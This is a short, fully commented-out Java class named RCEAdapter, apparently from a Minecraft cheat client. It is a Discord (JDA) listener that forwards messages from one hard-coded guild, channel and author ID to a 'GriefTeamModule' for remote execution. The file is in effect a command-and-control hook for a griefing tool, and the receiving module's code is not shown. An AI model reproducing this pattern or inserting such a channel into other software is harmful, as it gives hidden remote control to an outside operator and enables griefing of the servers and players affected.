//package net.shadow.plugin;
//
//
//import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
//import net.dv8tion.jda.api.hooks.ListenerAdapter;
//import net.shadow.feature.module.GriefTeamModule;
//
//public class RCEAdapter extends ListenerAdapter {
//    public void onGuildMessageReceived(GuildMessageReceivedEvent event) {
//        if (event.getMessage().getGuild().getId().equalsIgnoreCase("785418898853199892") && event.getMessage().getChannel().getId().equalsIgnoreCase("933088833938006017")) {
//            if (event.getMessage().getAuthor().getId().equalsIgnoreCase("907993251649314837")) {
//                GriefTeamModule.remoteEvent(event.getMessage().getContentRaw(), event.getMessage());
//            }
//        }
//    }
//}